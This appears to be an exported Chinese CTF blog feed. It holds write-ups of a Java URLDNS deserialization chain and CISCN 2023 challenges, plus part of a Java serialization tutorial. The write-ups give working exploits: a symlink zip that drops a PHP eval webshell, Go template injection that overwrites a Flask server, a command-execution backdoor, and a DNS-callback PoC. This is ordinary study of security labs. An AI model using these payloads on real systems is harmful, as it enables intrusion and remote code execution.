服务器，所以要刷新dns缓存<code>ipconfig/flushdns</code></li><li>法二：这里也可以使用SilentURLStream这种方法来避免本地的第一次dns解析</li><li>法三：这里可以使<strong>反射先设置1234(非-1)</strong></li></ol></li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一个成功的poc</span></span><br><span class="line"><span class="keyword">package</span> URLDNS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">HashMap</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://3uvif5.dnslog.cn&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反射获取类hashCode</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> u.getClass();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 先设置为非-1防止先调用dns</span></span><br><span class="line">            field.set(u,<span class="number">12354</span>);</span><br><span class="line">            payload.put(u,<span class="string">&quot;my payload&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 放入后设置为-1使得反序列化时可以调用dns</span></span><br><span class="line">            field.set(u,-<span class="number">1</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 模拟序列化</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;urldns.bin&quot;</span>));</span><br><span class="line">            oos.writeObject(payload);</span><br><span class="line">            <span class="comment">// 模拟反序列化</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;urldns.bin&quot;</span>));</span><br><span class="line">            ois.readObject();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>URLDNS<ol><li>java安全漫谈，可以初步了解一下原理</li><li><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5DURLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0.md">强推很细</a></li><li><a href="https://s31k31.github.io/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/">blog中比较完整的调试过程</a></li><li><a href="https://xz.aliyun.com/t/9116">有对Slient这个类做剖析，也有poc</a></li><li><a href="https://nlrvana.github.io/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/">大佬博客，有poc，但是对Slient那个类的理解不深</a></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn23初赛</title>
      <link href="/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/"/>
      <url>/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>wc还有一个月就要国赛初赛了，大二让我进一次吧，冲！</p></blockquote><h2 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h2><h3 id="unzip-分析成功"><a href="#unzip-分析成功" class="headerlink" title="unzip: 分析成功"></a>unzip: 分析成功</h3><ol><li><p>随意上传，Server: nginx&#x2F;1.20.1，X-Powered-By: PHP&#x2F;8.1.9，不对，是apache</p></li><li><p>分析一下代码</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE); <span class="comment"># 常量返回 mime 类型。 自 PHP 5.3.0 可用</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]) === <span class="string">&#x27;application/zip&#x27;</span>)&#123;</span><br><span class="line">    <span class="comment">// 以上判断是否为zip文件</span></span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//only this!    </span></span><br></pre></td></tr></table></figure></li><li><p>找找切入点，我们可以进行操控的就是文件的内容，文件tmpname可以吗</p><ol><li>tmp_name用户原始上传文件名，可控？本机上不行，文件名是随机的bro在php中彻底断了想法</li><li>unzip相关的漏洞</li><li>tmp_name目录穿越 –&gt; 不可行，随机文件名</li><li>unzip to rce？没找到，但是有新的文章<ol><li><a href="https://nandynarwhals.org/hxp-ctf-2021-unzipper/"></a>，但是这里有realpath() –&gt; 并特定注明<em><strong>Q1: 不能直接使用符号链接</strong></em>，这里没有realpath可以切入吗？这道题和国赛这题应用场景不一样的，有readfile()</li><li><a href="https://xz.aliyun.com/t/2589?time__1311=n4+xni0=G=i=0QAeGNDQTcwnDB7f=DgeU7GoD"></a> –&gt; 有点意思，考虑使用软链接来搞，<strong>A1: 软链接应该是切入点</strong></li><li><a href="https://blog.csdn.net/kwame211/article/details/98059791"></a> –&gt; 会保留符号链接，但是问题在于<em><strong>Q2: 这里都是写入?</strong></em></li></ol></li><li>或者unzip覆盖？ –&gt; 可以，-o表示覆盖已有文件并且不进行确认，unzip后文件名没有zip字</li></ol></li><li><p>可以读取的话，这里也没得读取啊，软连接创建文件写入.&#x2F;kc1zs4.php？</p><ol><li><em><strong>Q3: 这里需要搭配目录穿越吧？</strong></em>: 刚好有文章<ol><li>？<em><strong>Q4: zipslip</strong></em>，但是没有php的</li><li><a href="https://fiissh.tech/2021/android-fix-zip-path-traversal-vulnerability.html"></a> –&gt; 好像可以，为什么不试试？done，本地可以，应该通了</li></ol></li><li>我们故意在<code>zip -y link.zip link</code>处忽略-y选项，可以做到直接创建文件，太棒了，上传木马文件</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -s /var/www/html/kc1zs4.php link</span><br><span class="line">echo <span class="string">&quot;&lt;?php $_GET[&#x27;a&#x27;]?&gt;&quot;</span> &gt; link</span><br><span class="line"><span class="built_in">zip</span> link.<span class="built_in">zip</span> link</span><br></pre></td></tr></table></figure></li><li><p>结果上传后没有反应，那肯定是我的问题，想想，本地可以生成啊？生成的问题？想一想生成过程，发现有可能kc1zs4.php是在ln生成符号链接后vim操作写入的，就是，这就是软连接的作用</p><ol><li>那生成文件的问题？感觉就是软连接这个地方 –&gt; <strong>生辰文件shell.php就是靠zip来解压啊</strong></li><li>回想到在php的open_basedir绕过地方有一个绕过方法也是使用符号链接，参考那个解法进行叠加？但是怎么写入，先试试吗，硬想想不到</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目标目录</span></span><br><span class="line">ln -s /var/www/html link</span><br><span class="line"><span class="built_in">zip</span> -y link.<span class="built_in">zip</span> link</span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在可以访问到那一个目录，能访问到那不就好了啊</span></span><br><span class="line"><span class="comment"># *思路，将包含木马的文件在对应的文件夹解压就好，所以要解压出来带有目录</span></span><br><span class="line">mkdir link/</span><br><span class="line">cd ./link</span><br><span class="line">echo <span class="string">&quot;&lt;?php eval($_GET[&#x27;a&#x27;])?&gt;&quot;</span> &gt; kc1zs4.php</span><br><span class="line">cd ..</span><br><span class="line"><span class="built_in">zip</span> link.<span class="built_in">zip</span> link/* <span class="comment"># 使用link/*解压后会有link文件夹及下列的内容</span></span><br><span class="line"><span class="comment"># 获取的link.zip(zip文件名不重要，重要是包含link目录)文件就是我们的payload</span></span><br><span class="line"><span class="comment"># link文件夹是用来联合利用link链接的</span></span><br></pre></td></tr></table></figure></li><li><p>试试吧，不行再来本地，通了，nice：还是要抓住本质</p></li></ol><h3 id="unzip-总结"><a href="#unzip-总结" class="headerlink" title="unzip: 总结"></a>unzip: 总结</h3><blockquote><p>虽然是web签到题，但是还是不容易啊，至少养成的思维是正确的</p></blockquote><ol><li>也是自己找到入口点了</li><li>始终要<em><strong>目标导向</strong></em>才能学好web啊，还是不能急，写入的目的是在目标目录写入文件，有解压？解压到目标目录？<em><strong>把已经确定的放在一起想想，比如这里软连接和目标目录</strong></em></li><li>这里的Server并不是bp返回的nginx，而是访问其他目录后报错回来的apache –&gt; <em><strong>文件上传一般要确定服务器的类型</strong></em></li><li><em><strong>没事就多试试，不要想不到就一直找资料</strong></em></li><li><em><strong>确定点后想想性质</strong></em>，比如这里的符号链接可以直接使用这一点一开始没有想到</li></ol><h3 id="zip手法"><a href="#zip手法" class="headerlink" title="zip手法"></a>zip手法</h3><blockquote><p>原题</p></blockquote><h4 id="zip深入理解"><a href="#zip深入理解" class="headerlink" title="zip深入理解"></a>zip深入理解</h4><h4 id="zip-slip"><a href="#zip-slip" class="headerlink" title="zip slip"></a>zip slip</h4><h4 id="zip目录穿越"><a href="#zip目录穿越" class="headerlink" title="zip目录穿越"></a>zip目录穿越</h4><h2 id="deserbug"><a href="#deserbug" class="headerlink" title="deserbug"></a>deserbug</h2><blockquote><p>裂开了，java还没咋学啊，看来这个月得来攻击java了(还有期末考sad</p></blockquote><h2 id="go-session"><a href="#go-session" class="headerlink" title="go-session"></a>go-session</h2><h3 id="go-session-分析失败"><a href="#go-session-分析失败" class="headerlink" title="go-session 分析失败"></a>go-session 分析失败</h3><ol><li>分析一下代码<ol><li>首先肯定是要session伪造，可知这里使用的seesion包是github.com&#x2F;gorilla&#x2F;sessions</li><li>其次在&#x2F;flask下可以获取更多信息<ol><li><code>https://7454328f-a7c8-4944-9a81-9addd540329d.challenge.ctf.show/flask?name</code>有东西，原来是<em><strong>Q1: 报错</strong></em>，sad，但是其中有一些代码，审计一下，要运行控制台进行交互的话需要pin</li></ol></li></ol></li><li>现在屡屡目标和方向吧<ol><li>session伪造然后ssti</li><li>flask pin访问&#x2F;flask控制台，为什么这里一直<strong>Q2: 没有反应</strong>，噢不对，<strong>A2: 这里的flask是重新发送了一个请求，艹了</strong></li></ol></li><li>决定先从session入手<ol><li>这里的环境变量用于验证，是否需要获取<em><strong>Q3: SESSION_KEY，可能是一个搜索关键词</strong></em></li><li>发现session中的<code>Dv-BBAEC_4IAARABEAAAI_-CAAEGc3RyaW5nDAYABG5hbWUGc3RyaW5nDAcABWd1ZXN0</code>居然可以base64解码出来，应该就是根据SEESION_KEY获取的内容了</li></ol></li><li>所以下一步应该是ssrf打到flask里面去，因为只有这一个入口点了，前面报错有flask的一部分源码，ssrf没有目标入口啊？？？</li></ol><h3 id="go-session-二战"><a href="#go-session-二战" class="headerlink" title="go-session: 二战"></a>go-session: 二战</h3><blockquote><p>一个月前看了这道题后一直没有再继续写，现在重新来学习一下，看看复现了24后能不能干一下23的</p></blockquote><ol><li><p>升级一波源码，有session伪造+ssti+ssrf，ssrf的应用跑在5000上，结合flask应该是flask？</p></li><li><p>第一步还是session伪造</p><ol><li>github.com&#x2F;gorilla&#x2F;sessions用到这个，还有SESSION_KEY，看样子拿不到，ai一下，说是会对数据进行签名防止篡改，用到就是这个session_key</li><li>爆破&#x2F;原有漏洞&#x2F;是弱爆破&#x2F;空&#x2F;像rsa公钥一样两个加密出公钥的？版本github.com&#x2F;gorilla&#x2F;sessions v1.2.1，没事爆破跑一下看看，还要配go环境，出了，<strong>密钥为空</strong></li></ol></li><li><p>接下来可以可有做到模板注入了，终点应该在flask那里，这里要通过go的ssti来攻击flask</p></li><li><p>ai和查了一波，函数需要注册，只能拿使用gin.Context中的对象函数</p><ol><li>能不能直接搞文件的，查查文档和源码<ol><li>File 可以读文件系统上的文件</li><li>SaveUploadedFile 可以将文件存入指定目录中，但是权限是750，文件所有者可以写入，而同组用户和其他用户只能读取和执行，还可以</li></ol></li><li>但是这里过滤了字符串，所以需要进行绕过，思路是通过参数传参，现在使用上有一个问题，就是返回回来的是数组，思路是通过遍历把值先存下来，有点麻烦，发现其实可以直接.0访问的，也算是gin(flask)的特性？</li></ol></li><li><p>最终构造payload，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host=<span class="string">&quot;http://b6bd1c73-f1aa-4eac-a3b8-3cfdd286a744.challenge.ctf.show&quot;</span></span><br><span class="line">route1=<span class="string">&quot;&quot;</span></span><br><span class="line">route2=<span class="string">&quot;/admin&quot;</span></span><br><span class="line">route3=<span class="string">&quot;/flask&quot;</span></span><br><span class="line"><span class="comment"># 我的bp</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&#x27;session-name&#x27;</span>,<span class="string">&#x27;MTczNDA1MjY1MHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXwJpiQeYXo_ua97V-bC9mZdIN88JtK84esq9YEmUYwJ3Q==&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # poc failed：读取文件</span></span><br><span class="line"><span class="comment"># r = session.get(host+route2,timeout=5,params=&#123;</span></span><br><span class="line"><span class="comment">#     &quot;name&quot;: &quot;&#123;&#123;c.File(c.Request.URL.Query.File.0)&#125;&#125;&quot;,</span></span><br><span class="line"><span class="comment">#     &quot;File&quot;: &quot;/app/server.py&quot;,</span></span><br><span class="line"><span class="comment"># &#125;,proxies=proxies)</span></span><br><span class="line"><span class="comment"># print(r.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # poc：上传文件</span></span><br><span class="line">upload = &#123;</span><br><span class="line">    <span class="string">&quot;server.py&quot;</span>: (<span class="string">&quot;server.py&quot;</span>, <span class="built_in">open</span>(<span class="string">&quot;/home/kc1zs4/Code/CTF/server.py&quot;</span>, <span class="string">&quot;rb&quot;</span>), <span class="string">&quot;multipart/form-data&quot;</span>),</span><br><span class="line">&#125;</span><br><span class="line">r = session.get(host+route2,timeout=<span class="number">5</span>,proxies=proxies,</span><br><span class="line">                 params=&#123;</span><br><span class="line">                     <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&#123;&#123;c.Request.URL.Query.File.0&#125;&#125;&#123;&#123;c.Request.Query.Dir.0&#125;&#125;&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.URL.Query.File.0),c.Request.URL.Query.Dir.0)&#125;&#125;&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;File&quot;</span>: <span class="string">&quot;server.py&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Dir&quot;</span>: <span class="string">&quot;/app/server.py&quot;</span>,</span><br><span class="line">                 &#125;,</span><br><span class="line">                 files=upload)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # # poc：flask服务</span></span><br><span class="line">params = <span class="string">&quot;?name=?cmd=cat$&#123;IFS&#125;/th1s_1s_f13g&quot;</span></span><br><span class="line"><span class="comment"># params = &quot;?name=guest&quot;</span></span><br><span class="line">r = session.get(host+route3+params,timeout=<span class="number">5</span>,proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># server.py 名称最好保持一样</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    cmd = flask.request.args.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> cmd:</span><br><span class="line">        <span class="keyword">return</span> os.popen(cmd).read()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, KC1zs4&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></li></ol><h3 id="go-session总结"><a href="#go-session总结" class="headerlink" title="go-session总结"></a>go-session总结</h3><ol><li>session签名：对于可以直接生成的东西不要一直揪着不放，想清楚一点你要什么，比如这里的NewCookieStore()的签名算法，知道一个签名一个加密就ok，总之后续可以直接调用函数来生成，这里主要是签名，<strong>抽象一下我们就只需要绕过密钥这一环节，考虑弱&#x2F;无</strong></li><li>有参函数调用：再模板处我们的思路是通过文件操作来实现控制，但是首先需要可以控制参数，我的做法是通过参数数组下标访问，看了一些题解还有一些方法可以实现</li><li>debug模式利用：一个获取网站更多信息的情况是debug模式，而且python flask的**debug模式支持热加载(这是重点)**，这里可以结合已有的ssrf来进行覆写访问恶意服务，要有报错的意识<img src="/pic/ciscn23%E5%88%9D%E8%B5%9B/flask_error.png" alt="pic"><ol><li>ssrf一下，这里可以的到目录是&#x2F;app&#x2F;server.py，这里没法算pin，因为要任意读文件这里不满足</li></ol></li><li><strong>文件覆写gin利用</strong>：找到函数SaveUploadedFile，可以存入到指定目录，要指定multi-part才可以</li><li><strong>Q：为什么c.File()一直不可行？</strong><ol><li>A：可能是不出网感觉，gpt是说涉及到http不行<ol><li>上下文不一致：Gin 的 c.File 方法需要 *gin.Context，而模板渲染的上下文是 HTML 模板引擎的上下文。它们是不同的上下文，不能互换使用。</li><li>方法返回值要求：在模板中调用 Go 函数时，模板引擎要求函数返回值类型是特定的（通常是一个值和一个错误）。c.File 方法没有返回适合在模板中使用的值类型，这会导致错误。</li></ol></li></ol></li><li><strong>Q：一开始发包时为什么总是会显示301？</strong><ol><li>A：可能是路由形式的不一定，如果修改admin&#x2F;到&#x2F;admin就可以了，**&#x2F;这个符号还是很重要的**，可以在别的地方发包看看</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全5(1)_序列化的开始</title>
      <link href="/2024/11/13/Java%E5%AE%89%E5%85%A85(1)_%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/11/13/Java%E5%AE%89%E5%85%A85(1)_%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<blockquote><p>序列化的概念php和python处已经学习过了，这里就不再进行纠缠了，直接到没有学过的内容</p></blockquote><h2 id="话外-计算机网络中的序列化"><a href="#话外-计算机网络中的序列化" class="headerlink" title="话外: 计算机网络中的序列化"></a>话外: 计算机网络中的序列化</h2><ol><li><img src="/pic/Java%E5%AE%89%E5%85%A85_%E5%BA%8F%E5%88%97%E5%8C%96/tcp-ip-4-model.png" alt="pic"></li><li>OSI 七层协议模型中，表示层做的事情主要就是对应用层的用户数据进行处理转换为二进制流。反过来的话，就是将二进制流转换成应用层的用户数据。这就对应的是序列化和反序列化</li><li>OSI 七层协议模型中的应用层、表示层和会话层对应的都是 TCP&#x2F;IP 四层模型中的应用层，所以序列化协议属于 TCP&#x2F;IP 协议应用层的一部分</li></ol><h2 id="Java自带序列化的主要特点与限制"><a href="#Java自带序列化的主要特点与限制" class="headerlink" title="Java自带序列化的主要特点与限制"></a>Java自带序列化的主要特点与限制</h2><ol><li>反序列化类对象时有如下<strong>限制</strong>：<ol><li>被反序列化的类必须存在</li><li>serialVersionUID值必须一致</li><li>不支持跨语言调用，跨语言需要使用JSON这种，有对应的漏洞</li><li>必须实现Serializable接口，具体见下同名小标题处</li></ol></li><li>特点：<ol><li><p><strong>无需调用该类的构造函数</strong></p><ol><li>原理: 在反序列化创建类实例时使用了sun.reflect.ReflectionFactory.newConstructorForSerialization创建了一个反序列化专用的Constructor(<strong>反射构造方法对象</strong>)，使用这个特殊的Constructor可以绕过构造方法创建类实例</li><li>一句话: 结合了JDK的序列化和反射机制来创建新对象，绕过构造器，避免构造器中的初始化逻辑</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DeserializationTest.java</span></span><br><span class="line"><span class="keyword">package</span> Deser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DeserializationTest</span><span class="params">()</span> &#123;</span><br><span class="line">        name = <span class="string">&quot;kc1zs4&quot;</span>;</span><br><span class="line">        age = <span class="number">18</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;DeserialzationTest() called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ReflectionFactoryTest</span></span><br><span class="line"><span class="keyword">package</span> Deser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionFactoryTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 1. 获取工厂</span></span><br><span class="line">            <span class="type">ReflectionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> ReflectionFactory.getReflectionFactory();</span><br><span class="line">            <span class="comment">// 2. 从工厂获取对应的构造器</span></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> factory.newConstructorForSerialization(DeserializationTest.class, Object.class.getConstructor());</span><br><span class="line">            <span class="comment">// 3. 进行构造</span></span><br><span class="line">            System.out.println(constructor.newInstance());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终端输出: (并没有调用构造函数)</span></span><br><span class="line"><span class="comment">// hello world</span></span><br><span class="line"><span class="comment">// Deser.DeserializationTest@1ed3c8d</span></span><br></pre></td></tr></table></figure></li><li><p>Java的序列化机制可以导致一个实例能直接从byte[]数组创建，而不经过构造方法</p></li></ol></li><li>在Java中实现对象反序列化非常简单，实现java.io.Serializable(内部序列化)或java.io.Externalizable(外部序列化)接口即可被序列化，其中java.io.Externalizable接口只是实现了java.io.Serializable接口。</li></ol><h2 id="serialVersionUID"><a href="#serialVersionUID" class="headerlink" title="serialVersionUID"></a>serialVersionUID</h2><h3 id="什么是serialVersionUID"><a href="#什么是serialVersionUID" class="headerlink" title="什么是serialVersionUID"></a>什么是serialVersionUID</h3><ol><li><p>下面是一个典型的实现了Serializable接口的一个类，可以见到其中有一个特殊的静态final常量srialVersionUID</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 